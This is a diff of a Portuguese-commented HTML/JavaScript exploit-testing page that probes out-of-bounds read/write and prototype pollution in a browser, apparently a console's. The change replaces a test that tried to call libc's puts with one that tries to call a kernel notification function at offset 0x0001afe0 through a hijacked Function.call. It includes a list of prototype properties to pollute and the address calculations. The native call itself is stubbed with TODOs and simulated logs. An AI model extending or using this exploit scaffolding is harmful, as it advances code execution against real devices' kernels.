@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Script Focado (Baseado em Logs v18.1/v19.x)</title>
+    <title>Script Focado (Baseado em Logs)</title>
     <style>
         /* Estilos CSS (Mesmos de antes) */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
@@ -24,7 +24,7 @@
 </head>
 <body>
     <h1>Script Focado (Baseado em Logs v18.1/v19.x) - Implementação de Notificação</h1>
-    <p>Este script tenta explorar vulnerabilidades OOB R/W e PP, com foco em chamar uma função de notificação do Kernel (Estrutura adicionada, execução depende de gadget PP ou R/W).</p>
+    <p>Este script tenta explorar vulnerabilidades OOB R/W e PP, com foco em chamar uma função de notificação do Kernel.</p>
     <button id="runBtn">Iniciar Testes Focados</button>
     <div id="output">Logs aparecerão aqui...</div>
     <div id="summary">Sumário aparecerá aqui...</div>
@@ -54,7 +54,8 @@
             const gotEntryOffset = 0xABCDEF;     // Exemplo: Offset real de uma entrada GOT/PLT
             // const kernelTargetOffset = 0xABCDEF; // Offset genérico - Removido/Comentado
 
-            // !!! NOVO OFFSET ADICIONADO - Função de Notificação do Kernel (via Tabela) !!!
+            // <<< ADIÇÃO >>>
+            // !!! NOVO OFFSET - Função de Notificação do Kernel (via Tabela) !!!
             const notificationFuncOffset = 0x0001afe0; // Offset de FUN_0001afe0
 
             // Tipos de Log Importantes para o Sumário
@@ -260,7 +261,7 @@
                 let gadgetFound = [];
 
                 // Propriedades interessantes para tentar poluir e possíveis verificações de gadget
-                // *** Mantendo a versão ORIGINAL do gadgetCheck para Function.call ***
+                // Usando a versão ORIGINAL do gadgetCheck para Function.call, conforme solicitado
                 const propsToPollute = [
                     { proto: Object.prototype, prop: 'constructor' },
                     { proto: Object.prototype, prop: '__proto__' }, // Geralmente bloqueado, mas testar
@@ -277,7 +278,8 @@
                     { proto: Array.prototype, prop: 'filter'},
                     { proto: Array.prototype, prop: 'forEach'},
                     { proto: Array.prototype, prop: 'join'},
-                    { proto: Function.prototype, prop: 'call', gadgetCheck: (fn) => { try { fn.call(null); return false; } catch(e) { if(String(e).includes('polluted')){ gadgetFound.push('Function.call: Quebrado! Potencial hijack.'); return true;} return false;}}}, // <<< VERSÃO ORIGINAL DO CHECK
+                    // <<< Usando a verificação ORIGINAL do gadget Function.call >>>
+                    { proto: Function.prototype, prop: 'call', gadgetCheck: (fn) => { try { fn.call(null); return false; } catch(e) { if(String(e).includes('polluted')){ gadgetFound.push('Function.call: Quebrado! Potencial hijack.'); return true;} return false;}}},
                     { proto: Function.prototype, prop: 'apply' },
                     // { proto: JSON, prop: 'stringify', gadgetCheck: (obj) => { try { return JSON.stringify({}) !== '{}'; } catch(e) {return true;}} }, // Testado em teste separado
                 ];
@@ -341,49 +343,26 @@
                  }
             }
 
+            // <<< SUBSTITUIÇÃO >>>
             /*
-            * ========================================================================
-            * TESTE 5: SUBSTITUÍDO pela versão que tenta chamar a Notificação Kernel
-            * ========================================================================
-            */
-            /* // Função ANTIGA comentada: testPPGadgetCallLibc
-            async function testPPGadgetCallLibc() {
-                 const FNAME = 'testPPGadgetCallLibc';
-                 log(`--- Iniciando Teste: Tentativa de chamar puts via Hijack (Function.call) ---`, 'test', FNAME);
-                 if (!ppGadgetsBroken['Function.call']) {
-                     log(`Gadget Function.call não quebrado/detectado no teste anterior. Pulando.`, 'warn', FNAME);
-                     log(`--- Teste Concluído (Pulado) ---`, 'test', FNAME);
-                     return;
-                 }
-                 const targetPutsAddress = libcBaseAddress + putsOffset;
-                 log(`Endereço alvo calculado para puts: 0x${targetPutsAddress.toString(16)}`, 'info', FNAME);
-                 try {
-                    log(`Tentando chamar 0x${targetPutsAddress.toString(16)} via Function.call hijack...`, 'info', FNAME);
-                    log(`// TODO: Implementar preparação de argumento (ponteiro para string) e real hijack aqui.`, 'warn', FNAME);
-                    log(`VULN: (SIMULADO) Salto para 0x${targetPutsAddress.toString(16)} tentado via hijack!`, 'vuln', FNAME);
-                    log(`---> *** ALERTA: Potencial Execução de Código (se args e gadget funcionarem) ***`, 'escalation', FNAME);
-                 } catch (e) { log(`ERRO durante a tentativa de chamada puts: ${e.message}`, 'error', FNAME); }
-                 log(`--- Teste Concluído ---`, 'test', FNAME);
-            }
-            */
-
-            /*
-            * TESTE 5 (NOVO): Tentativa de Chamar Função do Kernel (Notificação) via Hijack (Function.call)
-            * Depende de: PP ter "quebrado" Function.call (gadget ativo - USANDO CHECK ORIGINAL) E conhecimento do offset real da função alvo no Kernel.
+            * TESTE 5: Tentativa de Chamar Função do Kernel (Notificação) via Hijack (Function.call)
+            * Depende de: PP ter "quebrado" Function.call (gadget ativo) E conhecimento do offset real da função alvo no Kernel.
+            * (Função adaptada da versão anterior que tentava chamar puts na libc)
             */
             async function testPPGadgetCallKernelNotify() {
                 const FNAME = 'testPPGadgetCallKernelNotify';
                 log(`--- Iniciando Teste: Tentativa de chamar Notificação Kernel via Hijack (Function.call) ---`, 'test', FNAME);
 
-                // Verifica se o gadget foi marcado como quebrado no teste anterior (usando o check ORIGINAL)
+                // Verifica se o gadget foi marcado como quebrado no teste anterior
+                // (Usando a lógica ORIGINAL do gadgetCheck)
                 if (!ppGadgetsBroken['Function.call']) {
                     log(`Gadget Function.call não quebrado/detectado no teste anterior. Pulando.`, 'warn', FNAME);
                     log(`--- Teste Concluído (Pulado) ---`, 'test', FNAME);
-                    return; // PULA SE O GADGET NÃO FOI ATIVADO
+                    return; // PULA SE O GADGET NÃO FOI ATIVADO pela verificação original
                 }
 
-                // >>> Se chegou aqui, o gadget Function.call foi considerado ATIVO pelo check ORIGINAL! <<<
-                log(`GOOD: Gadget Function.call detectado como ATIVO pelo check original! Prosseguindo com a tentativa de chamada...`, 'good', FNAME);
+                // >>> Se chegou aqui, a verificação ORIGINAL considerou o gadget ATIVO! <<<
+                log(`GOOD: Gadget Function.call detectado como ATIVO pela verificação original! Prosseguindo...`, 'good', FNAME);
 
                 // Calcular endereço alvo da função de notificação no kernel
                 const targetNotificationFuncAddress = libkernelBaseAddress + notificationFuncOffset;
@@ -400,12 +379,13 @@
                     //    - Ex: Ponteiro para string da mensagem, flags, tipo, duração?
                     //    - Colocar esses argumentos nos registradores corretos (RDI, RSI, RDX, RCX, R8, R9) ou na pilha.
                     //    - Isso geralmente requer ROP ou escrita arbitrária para controlar os registradores antes do salto.
-                    log(`// TODO: Implementar preparação de argumentos para FUN_0001afe0 aqui (RDI, RSI, etc.)`, 'warn', FNAME);
+                    log(`// TODO: Preparar argumentos para FUN_0001afe0 aqui (RDI, RSI, etc.)`, 'warn', FNAME);
 
                     // 2. Invocar a chamada sequestrada direcionando para o endereço alvo:
                     //    - A forma exata depende de como o gadget Function.call foi quebrado e como o controle
                     //      do ponteiro de instrução (IP/PC) foi obtido.
                     log(`// TODO: Implementar a real invocação/salto para targetNotificationFuncAddress usando o gadget`, 'warn', FNAME);
+
 
                     // Como não podemos executar código nativo real ou controlar registradores aqui,
                     // apenas registramos a intenção e marcamos como vulnerabilidade teórica.
@@ -418,7 +398,6 @@
 
                 log(`--- Teste Concluído ---`, 'test', FNAME);
             }
-            // ========================================================================
 
 
             /* TESTE 6: Interação PP Hijack (JSON.stringify) + OOB Interaction */
@@ -497,14 +476,14 @@
                 await PAUSE(MEDIUM_PAUSE);
                 await testArbitraryRW();
 
-                // 4. Testar Prototype Pollution Avançado (com gadgetCheck ORIGINAL)
+                // 4. Testar Prototype Pollution Avançado (usando gadgetCheck original)
                 await PAUSE(MEDIUM_PAUSE);
                 await testAdvancedPP();
 
                 // 5. Tentar chamar código NATIVO (Kernel Notify) usando Gadget PP
                 await PAUSE(MEDIUM_PAUSE);
-                // await testPPGadgetCallLibc(); // Chamada antiga (comentada para referência)
-                await testPPGadgetCallKernelNotify(); // <<< Chamada ATUALIZADA para a nova função
+                // <<< ATUALIZAÇÃO DA CHAMADA >>>
+                await testPPGadgetCallKernelNotify(); // Chama a função renomeada/adaptada
 
                 // 6. Testar outra interação PP + Leak
                 await PAUSE(MEDIUM_PAUSE);
